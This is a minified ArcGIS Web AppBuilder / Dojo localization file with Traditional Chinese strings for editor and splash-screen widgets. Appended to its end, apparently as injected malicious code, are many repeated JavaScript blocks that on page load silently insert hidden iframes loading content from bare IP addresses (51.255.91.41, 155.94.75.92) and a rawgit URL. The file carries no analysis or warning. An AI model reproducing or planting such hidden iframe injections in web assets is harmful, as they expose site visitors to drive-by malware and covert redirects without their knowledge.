// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"dijit/_editor/nls/commands":{bold:"\u7c97\u9ad4",copy:"\u8907\u88fd",cut:"\u526a\u4e0b","delete":"\u522a\u9664",indent:"\u7e2e\u6392",insertHorizontalRule:"\u6c34\u5e73\u5c3a\u898f",insertOrderedList:"\u7de8\u865f\u6e05\u55ae",insertUnorderedList:"\u9805\u76ee\u7b26\u865f\u6e05\u55ae",italic:"\u659c\u9ad4",justifyCenter:"\u7f6e\u4e2d\u5c0d\u9f4a",justifyFull:"\u5c0d\u9f4a",justifyLeft:"\u9760\u5de6\u5c0d\u9f4a",justifyRight:"\u9760\u53f3\u5c0d\u9f4a",outdent:"\u51f8\u6392",paste:"\u8cbc\u4e0a",
redo:"\u91cd\u505a",removeFormat:"\u79fb\u9664\u683c\u5f0f",selectAll:"\u5168\u9078",strikethrough:"\u522a\u9664\u7dda",subscript:"\u4e0b\u6a19",superscript:"\u4e0a\u6a19",underline:"\u5e95\u7dda",undo:"\u5fa9\u539f",unlink:"\u79fb\u9664\u93c8\u7d50",createLink:"\u5efa\u7acb\u93c8\u7d50",toggleDir:"\u5207\u63db\u65b9\u5411",insertImage:"\u63d2\u5165\u5f71\u50cf",insertTable:"\u63d2\u5165/\u7de8\u8f2f\u8868\u683c",toggleTableBorder:"\u5207\u63db\u8868\u683c\u908a\u6846",deleteTable:"\u522a\u9664\u8868\u683c",
tableProp:"\u8868\u683c\u5167\u5bb9",htmlToggle:"HTML \u539f\u59cb\u6a94",foreColor:"\u524d\u666f\u984f\u8272",hiliteColor:"\u80cc\u666f\u984f\u8272",plainFormatBlock:"\u6bb5\u843d\u6a23\u5f0f",formatBlock:"\u6bb5\u843d\u6a23\u5f0f",fontSize:"\u5b57\u578b\u5927\u5c0f",fontName:"\u5b57\u578b\u540d\u7a31",tabIndent:"\u6a19\u7c64\u7e2e\u6392",fullScreen:"\u5207\u63db\u5168\u87a2\u5e55",viewSource:"\u6aa2\u8996 HTML \u539f\u59cb\u6a94",print:"\u5217\u5370",newPage:"\u65b0\u9801\u9762",systemShortcut:'"${0}" \u52d5\u4f5c\u5728\u60a8\u7684\u700f\u89bd\u5668\u4e2d\uff0c\u53ea\u80fd\u4f7f\u7528\u9375\u76e4\u5feb\u901f\u9375\u3002\u8acb\u4f7f\u7528 ${1}\u3002',
ctrlKey:"ctrl+${0}",appleKey:"\u2318${0}",_localized:{}},"dijit/_editor/nls/FontChoice":{fontSize:"\u5927\u5c0f",fontName:"\u5b57\u578b",formatBlock:"\u683c\u5f0f",serif:"\u65b0\u7d30\u660e\u9ad4","sans-serif":"\u65b0\u7d30\u660e\u9ad4",monospace:"\u7b49\u5bec",cursive:"Cursive",fantasy:"Fantasy",noFormat:"\u7121",p:"\u6bb5\u843d",h1:"\u6a19\u984c",h2:"\u5b50\u6a19\u984c",h3:"\u6b21\u5b50\u6a19\u984c",pre:"\u9810\u5148\u683c\u5f0f\u5316",1:"\u6700\u5c0f",2:"\u8f03\u5c0f",3:"\u5c0f",4:"\u4e2d",5:"\u5927",
6:"\u8f03\u5927",7:"\u6700\u5927",_localized:{}},"dojox/editor/plugins/nls/Preview":{preview:"\u9810\u89bd",_localized:{}},"dojox/editor/plugins/nls/FindReplace":{findLabel:"\u5c0b\u627e\uff1a",findTooltip:"\u8f38\u5165\u8981\u5c0b\u627e\u7684\u6587\u5b57",replaceLabel:"\u53d6\u4ee3\u70ba\uff1a",replaceTooltip:"\u8f38\u5165\u8981\u53d6\u4ee3\u7684\u6587\u5b57",findReplace:"\u5c0b\u627e/\u53d6\u4ee3",matchCase:"\u5927\u5c0f\u5beb\u76f8\u7b26",matchCaseTooltip:"\u5927\u5c0f\u5beb\u76f8\u7b26",backwards:"\u5411\u5f8c",
backwardsTooltip:"\u5f80\u56de\u641c\u5c0b\u6587\u5b57",replaceAllButton:"\u5168\u90e8\u53d6\u4ee3",replaceAllButtonTooltip:"\u53d6\u4ee3\u6240\u6709\u6587\u5b57",findButton:"\u5c0b\u627e",findButtonTooltip:"\u5c0b\u627e\u6587\u5b57",replaceButton:"\u53d6\u4ee3",replaceButtonTooltip:"\u53d6\u4ee3\u6587\u5b57",replaceDialogText:"\u53d6\u4ee3\u4e86 ${0} \u9805\u3002",eofDialogText:"\u524d\u6b21\u51fa\u73fe ${0}",eofDialogTextFind:"\u627e\u5230",eofDialogTextReplace:"\u5df2\u53d6\u4ee3",_localized:{}},
"dojox/editor/plugins/nls/PasteFromWord":{pasteFromWord:"\u5f9e Word \u8cbc\u4e0a",instructions:"\u5c07 Word \u4e2d\u7684\u5167\u5bb9\u8cbc\u5165\u4e0b\u65b9\u7684\u6587\u5b57\u6846\u3002\u5728\u6eff\u610f\u8981\u63d2\u5165\u7684\u5167\u5bb9\u4e4b\u5f8c\uff0c\u8acb\u6309\u8cbc\u4e0a\u6309\u9215\u3002\u82e5\u8981\u4e2d\u65b7\u63d2\u5165\u6587\u5b57\uff0c\u8acb\u6309\u53d6\u6d88\u6309\u9215\u3002",_localized:{}},"dojox/editor/plugins/nls/InsertAnchor":{insertAnchor:"\u63d2\u5165\u9328\u9ede",title:"\u9328\u9ede\u5167\u5bb9",
anchor:"\u540d\u7a31\uff1a",text:"\u8aaa\u660e\uff1a",set:"\u8a2d\u5b9a",cancel:"\u53d6\u6d88",_localized:{}},"dojox/editor/plugins/nls/Blockquote":{blockquote:"\u5340\u584a\u5f15\u6587",_localized:{}},"widgets/Splash/setting/nls/strings":{instruction:"\u6703\u5148\u51fa\u73fe\u555f\u52d5\u756b\u9762\uff0c\u624d\u80fd\u5b58\u53d6\u61c9\u7528\u7a0b\u5f0f\u3002",defaultContent:"\u5728\u6b64\u65b0\u589e\u6587\u5b57\u3001\u9023\u7d50\u548c\u5c0f\u5716\u5f62\u3002",requireConfirm:"\u9700\u8981\u78ba\u8a8d\u624d\u80fd\u7e7c\u7e8c",
noRequireConfirm:"\u7121\u9700\u78ba\u8a8d\u5373\u53ef\u7e7c\u7e8c",optionText:"\u4f9b\u4f7f\u7528\u8005\u5728\u61c9\u7528\u7a0b\u5f0f\u555f\u52d5\u6642\u7528\u4f86\u505c\u7528\u555f\u52d5\u756b\u9762\u7684\u9078\u9805\u3002",confirmLabel:"\u78ba\u8a8d\u6587\u5b57\uff1a ",confirmLabelColor:"\u78ba\u8a8d\u6587\u5b57\u984f\u8272",defaultConfirmText:"\u6211\u540c\u610f\u4e0a\u8ff0\u689d\u6b3e\u548c\u689d\u4ef6",confirmOption:"\u6bcf\u6b21\u555f\u52d5\u61c9\u7528\u7a0b\u5f0f\u6642\u4e00\u5f8b\u986f\u793a\u6b64\u555f\u52d5\u756b\u9762",
backgroundColor:"\u80cc\u666f\u984f\u8272",content:"\u5167\u5bb9",contentDescription:"\u5b9a\u7fa9\u555f\u52d5\u756b\u9762\u4e0a\u986f\u793a\u7684\u5167\u5bb9\u3002",appearance:"\u5916\u89c0",appearanceDescription:"\u8a2d\u5b9a\u555f\u52d5\u756b\u9762\u7684\u5916\u89c0\u3002",size:"\u5c3a\u5bf8",width:"\u5bec\u5ea6",height:"\u9ad8\u5ea6",custom:"\u81ea\u8a02",background:"\u80cc\u666f",colorFill:"\u984f\u8272\u586b\u5145",imageFill:"\u5716\u7247\u586b\u5145",chooseFile:"\u9078\u64c7\u6a94\u6848",noFileChosen:"\u672a\u9078\u64c7\u6a94\u6848",
transparency:"\u5e7b\u71c8\u7247",sizeFill:"\u586b\u5145",sizeFit:"\u9069\u5408",sizeStretch:"\u7e2e\u653e\u4ee5\u586b\u5145",sizeCenter:"\u5c45\u4e2d\u5c0d\u9f4a",sizeTile:"\u5716\u78da",buttonColor:"\u6309\u9215\u984f\u8272",buttonText:"\u6309\u9215\u6587\u5b57",buttonTextColor:"\u6309\u9215\u6587\u5b57\u984f\u8272",contentAlign:"\u5167\u5bb9\u5c0d\u9f4a",alignTop:"\u9802\u90e8",alignMiddle:"\u4e2d\u592e",maskColor:"\u9762\u7f69\u984f\u8272",options:"\u9078\u9805",optionsDescription:"\u8a2d\u5b9a\u555f\u52d5\u756b\u9762\u7684\u884c\u70ba\u3002",
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});